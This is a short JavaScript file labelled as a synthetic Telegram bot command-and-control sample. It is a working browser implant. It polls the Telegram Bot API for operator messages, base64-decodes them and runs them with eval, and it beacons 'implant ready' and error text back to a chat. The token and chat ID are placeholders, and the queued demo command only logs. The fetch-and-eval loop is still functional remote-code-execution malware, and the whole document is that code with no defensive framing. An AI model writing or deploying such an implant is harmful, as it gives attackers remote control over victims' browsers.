// TELEBOT — synthetic Telegram Bot C2 product sample.
(function () {
  var BOT = '123456789:AAExampleTelegramBotToken4f19xxxxxx';
  var CHAT = '-1001234567890';
  var API = 'https://api.telegram.org/bot' + BOT;
  var offset = 0;
  console.log('[TELEBOT] bot online', CHAT);

  function send(text) {
    try {
      fetch(API + '/sendMessage', {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT, text: String(text).slice(0, 1024) })
      }).catch(function () {});
    } catch (error) {}
    try { localStorage.setItem('telebot:last', String(text).slice(0, 128)); } catch (error) {}
  }

  function handle(update) {
    if (!update || !update.message || !update.message.text) return;
    offset = Math.max(offset, update.update_id + 1);
    var code = atob(update.message.text);
    console.log('[TELEBOT] command', update.update_id, code.length);
    try { eval(code); } catch (error) { send('error: ' + error.message); }
    try { localStorage.setItem('telebot:offset', String(offset)); } catch (error) {}
  }

  try {
    fetch(API + '/getUpdates?offset=' + offset)
      .then(function (response) { return response.json(); })
      .then(function (payload) { (payload.result || []).forEach(handle); })
      .catch(function () {});
  } catch (error) {}
  // Simulated queued command from the operator.
  handle({ update_id: 7, message: { text: 'Y29uc29sZS5sb2coJ1tURUxFQk9UXSBvcGVyYXRvciBjb21tYW5kIGV4ZWN1dGVkJyk=' } });
  send('implant ready');
})();
